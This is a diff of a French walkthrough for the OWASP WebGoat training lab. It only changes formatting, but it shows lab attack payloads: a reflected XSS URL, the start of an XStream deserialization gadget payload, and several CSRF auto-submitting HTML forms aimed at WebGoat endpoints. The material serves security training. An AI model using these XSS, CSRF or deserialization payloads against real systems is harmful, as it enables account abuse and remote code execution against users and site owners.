@@ -772,7 +772,7 @@ Entrer `<script>alert()</script>` dans la case **Enter your credit card number:*
 ![Hint](images/wiki_owasp_webgoat/hint.png) Replace '/' with '%2F' in your URL parameters.
 
 *   Ouvrir les _Outils de développements_ du navigateur, et aller dans l'onglet _Console_.
-*   Naviguer vers l'URL [http://host:port/WebGoat/start.mvc#test/<script>webgoat.customjs.phoneHome()<%2Fscript>](http://host:port/WebGoat/start.mvc#test/<script>webgoat.customjs.phoneHome()<%2Fscript>)
+*   Naviguer vers l'URL [http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;](http://host:port/WebGoat/start.mvc#test/&lt;script&gt;webgoat.customjs.phoneHome()&lt;%2Fscript&gt;)
 *   Récupérer le numéro en sortie de la fonction.
 
 ![XSS 11](images/wiki_owasp_webgoat/xss-11.png)
@@ -862,7 +862,7 @@ public class AntiSamyController {
 
 Pour la désérialisation, suivre le lien http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/ pour comprendre comment cela fonctionne. Le _payload_ suivant devrait fonctionner, mais ce n'est pas le cas.
 
-```  
+```xml
 <sorted-set>  
      <string>foo</string>  
      <dynamic-proxy>  
@@ -891,7 +891,7 @@ Pour la désérialisation, suivre le lien http://www.pwntester.com/blog/2013/12/
 
 Sauvegarder le code suivant dans un fichier **csrf.html** et l'ouvrir dans un navigateur.
 
-``` 
+```html
 <form name="attack" action="http://host:port/WebGoat/csrf/basic-get-flag" method="POST">  
      <input type="hidden" name='csrf' value='true'>  
 </form>  
@@ -905,7 +905,7 @@ Sauvegarder le code suivant dans un fichier **csrf.html** et l'ouvrir dans un na
 
 Sauvegarder le code suivant dans un fichier **csrf.html** et l'ouvrir dans un navigateur.
 
-``` 
+```html
 <form name="attack" action="http://host:port/WebGoat/csrf/review" method="POST">  
      <input type="hidden" name='reviewText' value='This App Rocks'>  
      <input type="hidden" name='stars' value='5'>  
@@ -921,7 +921,7 @@ Sauvegarder le code suivant dans un fichier **csrf.html** et l'ouvrir dans un na
 
 Sauvegarder le code suivant dans un fichier **csrf.html** et l'ouvrir dans un navigateur. 
 
-``` 
+```html
 <form name="attack" enctype="text/plain" action="http://host:port/WebGoat/csrf/feedback/message" method="POST">  
      <input type="hidden" name='{"name": "Test", "email": "test1233@dfssdf.de", "subject": "service", "message":"dsaffd"}'>  
 </form>  
